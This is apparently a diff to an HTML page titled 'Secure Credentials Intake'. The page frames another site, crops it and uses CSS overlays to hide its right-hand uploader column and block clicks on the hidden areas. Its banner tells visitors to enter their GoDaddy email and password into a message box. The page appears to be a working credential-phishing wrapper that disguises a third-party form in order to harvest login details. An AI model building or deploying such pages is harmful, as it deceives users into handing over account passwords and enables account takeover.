@@ -5,80 +5,58 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Secure Credentials Intake</title>
 <style>
-  :root {
-    --offset: 360px;   /* how much of the top to hide */
+  :root{
+    --offset: 360px;   /* crop this much from the top */
     --vh: 1100px;      /* visible height of the box */
+    --mask: 52%;       /* how much of the RIGHT side to hide */
   }
 
-  body {
-    margin: 0;
-    font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+  body{ margin:0; font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif; }
+
+  .build-check{
+    padding:10px;background:#ffeb3b;color:#111;font:700 14px/1 system-ui,-apple-system,Segoe UI,Roboto,Arial;text-align:center
   }
 
-  .build-check {
-    padding: 10px;
-    background: #ffeb3b;
-    color: #111;
-    font: 700 14px/1 system-ui, -apple-system, Segoe UI, Roboto, Arial;
-    text-align: center;
+  .viewport{
+    position:relative;width:100%;height:var(--vh);overflow:hidden;
+    border:1px solid #ddd;border-radius:12px;background:#fff;box-sizing:border-box;
   }
 
-  .viewport {
-    position: relative;
-    width: 100%;
-    height: var(--vh);
-    overflow: hidden;               /* crops top + right */
-    border: 1px solid #ddd;
-    border-radius: 12px;
-    background: #fff;
-    box-sizing: border-box;
+  .note{
+    position:sticky;top:0;z-index:11;display:flex;align-items:center;justify-content:center;
+    min-height:46px;padding:10px 14px;font:600 14px/1.3 system-ui,-apple-system,Segoe UI,Roboto,Arial;
+    color:#222;background:#fff;border-bottom:1px solid #eee;
   }
 
-  .note {
-    position: sticky;
-    top: 0;
-    z-index: 11;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    min-height: 46px;
-    padding: 10px 14px;
-    font: 600 14px/1.3 system-ui,-apple-system,Segoe UI,Roboto,Arial;
-    color:#222;
-    background:#fff;
-    border-bottom:1px solid #eee;
+  /* regular width iframe; we’ll mask the right side */
+  .ds-frame{
+    position:absolute;inset:0;border:0;width:100%;
+    height:calc(var(--vh) + var(--offset) + 800px);
+    transform:translateY(calc(var(--offset) * -1)); /* crop top */
   }
 
-  .ds-frame {
-    position: absolute;
-    inset: 0;
-    border: 0;
-    /* Show only left column */
-    width: 200%; 
-    height: calc(var(--vh) + var(--offset) + 800px);
-    transform: translate(-50%, calc(var(--offset) * -1));
+  /* blocks clicks on the cropped top */
+  .click-shield{
+    position:absolute;left:0;top:0;right:0;height:var(--offset);
+    pointer-events:auto;background:transparent;z-index:10;
   }
 
-  .click-shield {
-    position: absolute;
-    left: 0;
-    top: 0;
-    right: 0;
-    height: var(--offset);
-    pointer-events: auto;
-    background: transparent;
-    z-index: 10;
+  /* hides the RIGHT column (uploader) visually + blocks clicks */
+  .overlay-right{
+    position:absolute;top:var(--offset);right:0;bottom:0;width:var(--mask);
+    background:#fff;z-index:20;pointer-events:auto;
+    /* optional subtle divider: */
+    box-shadow: -1px 0 0 #eee;
   }
 
-  @media (max-width: 640px) {
-    :root { --offset: 420px; --vh: 1250px; }
-    .ds-frame { transform: translate(-50%, calc(var(--offset) * -1)); }
+  @media (max-width: 640px){
+    :root{ --offset: 420px; --vh: 1250px; --mask: 100%; } /* on narrow screens, hide all right side */
   }
 </style>
 </head>
 <body>
 
-  <div class="build-check">WRAPPER ACTIVE — left column only</div>
+  <div class="build-check">WRAPPER ACTIVE — left column shown, right uploader hidden</div>
 
   <div class="viewport">
     <div class="note">Enter your GoDaddy Email (line 1) and Password (line 2) in the message box below.</div>
@@ -89,6 +67,7 @@
       title="Secure Credentials Intake"></iframe>
 
     <div class="click-shield" aria-hidden="true"></div>
+    <div class="overlay-right" aria-hidden="true"></div>
   </div>
 
 </body>
